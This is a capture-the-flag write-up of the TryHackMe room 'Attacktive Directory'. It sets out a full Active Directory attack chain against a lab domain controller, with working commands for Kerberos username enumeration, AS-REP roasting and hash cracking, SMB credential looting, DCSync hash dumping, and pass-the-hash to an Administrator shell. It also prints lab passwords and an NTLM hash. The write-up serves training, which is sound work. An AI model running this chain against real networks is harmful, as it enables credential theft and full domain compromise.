# Attacktive Directory

| Field      | Detail                        |
|------------|-------------------------------|
| Platform   | TryHackMe                     |
| Category   | Active Directory / Pentesting |
| Difficulty | Medium                        |
| Points     | —                             |
| Date       | 2026-05-18                    |
| Status     | Solved                        |

---

## Description

> 99% of Corporate Networks run off of AD. Can you exploit a vulnerable Domain Controller?

Full AD kill chain: Kerberos enumeration, AS-REP Roasting, credential cracking, SMB enumeration, DCSync via secretsdump, and Pass the Hash to full domain compromise.

---

## Target Info

| Field       | Value           |
|-------------|-----------------|
| Machine IP  | 10.144.134.204  |
| Domain      | spookysec.local |
| DC Hostname | —               |

---

## Initial Observations

The target is a Windows Domain Controller with port 88 (Kerberos) exposed. This allows username enumeration without any authentication. SMB (139/445) is also open. The domain uses the `.local` TLD — a common but technically invalid TLD used in internal AD environments. The attack surface is a full Kerberos + SMB kill chain.

---

## Approach

**Task 1 — Setup**

Connected via TryHackMe AttackBox (browser-based Kali). No VPN required. Deployed the target machine and confirmed connectivity with `ping 10.144.134.204`.

---

**Task 2 — Username Enumeration (kerbrute)**

Used kerbrute to enumerate valid AD accounts against Kerberos port 88. No password needed — kerbrute tests usernames by requesting TGTs and checking the error response.

```bash
kerbrute userenum --dc 10.144.134.204 -d spookysec.local userlist.txt
```

Found 16 valid usernames. Two stood out immediately:
- `svc-admin` — service account, prime AS-REP Roasting target
- `backup` — backup accounts typically hold DCSync/replication rights

![[Pasted image 20260518172342.png]]

---

**Task 3 — AS-REP Roasting (svc-admin)**

Accounts with Kerberos pre-authentication disabled will hand out an encrypted TGT hash to anyone who asks — no password required. Used Impacket's GetNPUsers to check all enumerated accounts:

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.144.134.204 2>/dev/null | grep krb5asrep
```

`svc-admin` had pre-auth disabled. The DC returned a Kerberos 5 AS-REP hash (etype 23) that can be cracked entirely offline.

---

**Task 4 — Hash Cracking (hashcat mode 18200)**

Saved the hash to `hash.txt` and cracked it against the room's password list:

```bash
hashcat -m 18200 hash.txt passwordlist.txt --force
```

Cracked in under 1 second. Recovered credential: `svc-admin:management2005`

![[Pasted image 20260518174500.png]]

---

**Task 5 — SMB Enumeration with svc-admin credentials**

Used the cracked credentials to enumerate SMB shares:

```bash
smbclient -L //10.144.134.204 -U svc-admin
```

Found a `backup` share. Connected and retrieved a credentials file:

```bash
smbclient //10.144.134.204/backup -U svc-admin
get credentials.txt
cat credentials.txt
```

Found: `backup@spookysec.local:backup2517860`

![[Pasted image 20260518175537.png|697]]
![[Pasted image 20260518175653.png]]
![[Pasted image 20260518180230.png|697]]

![[Pasted image 20260518180147.png]]

---

**Task 6 — DCSync with secretsdump**

The `backup` account has domain replication (DCSync) rights — it can pull all password hashes from the DC. Used Impacket's secretsdump:

```bash
python3 /opt/impacket/examples/secretsdump.py -just-dc backup:backup2517860@10.144.134.204
```

Dumped every NTLM hash in the domain including Administrator:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Administrator NTLM hash: `0e0363213e37b94221497260b0bcb4fc`

Used Pass the Hash with evil-winrm — no plaintext password needed:

```bash
evil-winrm -i 10.144.134.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Got an Administrator shell on the Domain Controller.

![[Pasted image 20260518181123.png]]

![[Pasted image 20260518181602.png]]

![[Pasted image 20260518181738.png]]

![[Pasted image 20260518181828.png]]

---

**Task 7 — Flag Collection**

Retrieved flags from each user's desktop via the Administrator shell:

```
cd C:\Users\svc-admin\Desktop && type personal.txt
cd C:\Users\backup\Desktop && type personal.txt
cd C:\Users\Administrator\Desktop && type root.txt
```

![[Pasted image 20260518182423.png]]

![[Pasted image 20260518182917.png]]

![[Pasted image 20260518183038.png]]

---

## Tools Used

- `kerbrute` — Kerberos username enumeration without authentication
- `impacket GetNPUsers` — AS-REP Roasting, extracts hashes from accounts with pre-auth disabled
- `hashcat` (mode 18200) — offline cracking of Kerberos 5 AS-REP etype 23 hashes
- `smbclient` — SMB share enumeration and file retrieval
- `impacket secretsdump` — DCSync attack to dump all domain NTLM hashes
- `evil-winrm` — WinRM shell via Pass the Hash (`-H` flag)

---

## Key Finding

The `backup` account is the critical pivot. Its DCSync rights allow full domain hash extraction without ever directly attacking the Administrator account. This is a common real-world misconfiguration — backup/replication service accounts are granted domain replication permissions but left with a guessable password.

---

## Solution

Full kill chain:

```
kerbrute userenum
  → svc-admin, backup discovered

GetNPUsers (AS-REP Roast)
  → svc-admin hash extracted (pre-auth disabled)

hashcat -m 18200
  → svc-admin:management2005

smbclient //10.144.134.204/backup
  → backup:backup2517860

secretsdump.py (DCSync)
  → Administrator NTLM: 0e0363213e37b94221497260b0bcb4fc

evil-winrm -H (Pass the Hash)
  → Administrator shell → all flags captured
```

---

## Lessons Learned

- Kerberos pre-auth disabled on a service account is an instant hash leak — no brute force, no authentication, minimal noise.
- `.local` TLD in AD is a signal for older, potentially misconfigured environments.
- Backup/replication accounts are high-value targets — DCSync rights + weak password = full domain compromise without touching the Administrator account directly.
- Pass the Hash with evil-winrm works directly with NTLM hashes — cracking the Administrator password is never necessary if you can dump hashes via DCSync.
